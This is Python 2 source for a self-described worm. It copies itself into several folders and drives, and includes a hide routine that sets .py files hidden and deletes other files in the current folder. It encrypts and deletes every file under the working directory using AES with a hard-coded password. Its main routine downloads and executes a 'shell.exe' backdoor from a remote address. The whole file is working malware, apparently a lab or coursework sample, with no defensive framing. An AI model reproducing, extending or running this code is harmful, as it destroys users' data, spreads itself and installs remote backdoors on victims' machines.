#========WORM==========
from shutil import copyfile
import os, getpass
from sys import argv
import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil

def propagate():
	#gets the current location of the worm
	src=os.path.abspath("worm.py")
	#gets the username of the linux user
	usr=getpass.getuser()

	#checks for E:/ drive on windows
	if(os.path.isdir("E:\\")):
		#saves location
		dst="E:"+"\\worm.py"

	#checks for Documents folder in Linux
	elif(os.path.isdir("/home/"+usr+"/Documents/")):
		#saves location
		dst="/home/"+usr+"/Documents/"+"worm.py"

	#checks for C:/ drive on windows
	elif(os.path.isdir("C:\\")):
		#saves location
		dst="C:\\Users\\"+usr+"\\worm.py"

	#checks for Downloads folder in Linux
	elif(os.path.isdir("/home/"+usr+"/Downloads/")):
		#saves location
		dst="/home/"+usr+"/Downloads/"+"worm.py"
	
	else:
		#save location of current directory		
		dst=os.getcwd()+"\\worm1.py"

	#Copies file to new location	
	copyfile(src,dst)
	run(dst)
	print "Worm Location"
	print "dst: "+dst
	print "src: "+src



def copy():
        script = argv
        name = str(script[0])
        b = os.path.getsize(os.path.abspath("C:"))
        for i in range(0,4):
                directoryName = "copy"+str(i)
                os.mkdir(directoryName)
                shutil.copy(name, directoryName)
                src=os.path.abspath(directoryName)

def hide():
        for fname in os.listdir('.'):
                if fname.find('.py') == len(fname) - len('.py'):
                        #make the file hidden
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
                elif fname.find('.txt') == len(fname) - len('.txt'):
                        #make the file read only
                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
                else:
                        #to force deletion of a file set it to normal
                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
                        os.remove(fname)



 
def encrypt(key, filename):
        chunksize = 64 * 1024
        outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
        filesize = str(os.path.getsize(filename)).zfill(16)
        IV = ''
 
        for i in range(16):
                IV += chr(random.randint(0, 0xFF))
       
        encryptor = AES.new(key, AES.MODE_CBC, IV)
 
        with open(filename, "rb") as infile:
                with open(outFile, "wb") as outfile:
                        outfile.write(filesize)
                        outfile.write(IV)
                        while True:
                                chunk = infile.read(chunksize)
                               
                                if len(chunk) == 0:
                                        break
 
                                elif len(chunk) % 16 !=0:
                                        chunk += ' ' *  (16 - (len(chunk) % 16))
 
                                outfile.write(encryptor.encrypt(chunk))
 
 
def decrypt(key, filename):
        outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename[11:]))
        chunksize = 64 * 1024
        with open(filename, "rb") as infile:
                filesize = infile.read(16)
                IV = infile.read(16)
 
                decryptor = AES.new(key, AES.MODE_CBC, IV)
               
                with open(outFile, "wb") as outfile:
                        while True:
                                chunk = infile.read(chunksize)
                                if len(chunk) == 0:
                                        break
 
                                outfile.write(decryptor.decrypt(chunk))
 
                        outfile.truncate(int(filesize))
       
def allfiles():
        allFiles = []
        for root, subfiles, files in os.walk(os.getcwd()):
                for names in files:
                        allFiles.append(os.path.join(root, names))
 
        return allFiles
 
def action():
        password = "QEWJR3OIR2YUD92128!$##%$^*(093URO3DMKMXS,NCFJVHBHDUWQDHUDHQ9jswdhgehydxbhwqdbwyhfc"
        encFiles = allfiles()
        for Tfiles in encFiles:
                if os.path.basename(Tfiles).startswith("(encrypted)"):
                        print "%s is already encrypted" %str(Tfiles)
                        pass
 
                elif Tfiles == os.path.join(os.getcwd(), sys.argv[0]):
                        pass
                else:
                        encrypt(SHA256.new(password).digest(), str(Tfiles))
                        print "Done encrypting %s" %str(Tfiles)
                        os.remove(Tfiles)


def downloadBackdoor(url):
	# get filename from url
                filename = url.split('/')[-1].split('#')[0].split('?')[0]
                content = urlopen(url).read()
                outfile = open(filename, "wb")
                outfile.write(content)
                outfile.close()
                run(os.path.abspath(filename))
                print "finish downloading"
        

def run(prog):
        process = sp.Popen(prog, shell=True)
        process.wait()


def main():
        copy()
        #hide()
        #propagate()
        action()
        downloadBackdoor("http://172.16.190.175/security/dist/shell.exe")
        
        

if __name__=="__main__":
        main()
        


        
                









